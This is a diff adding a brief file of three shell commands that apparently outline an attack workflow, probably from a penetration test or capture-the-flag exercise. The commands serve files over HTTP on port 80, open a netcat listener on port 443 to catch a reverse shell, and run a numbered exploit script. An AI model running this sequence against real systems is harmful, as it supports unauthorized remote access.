@@ -1,0 +1,7 @@
+
+::: python -m SimpleHTTPServer 80
+      
+
+::: nc -nlvp 443
+
+::: python 39161.py
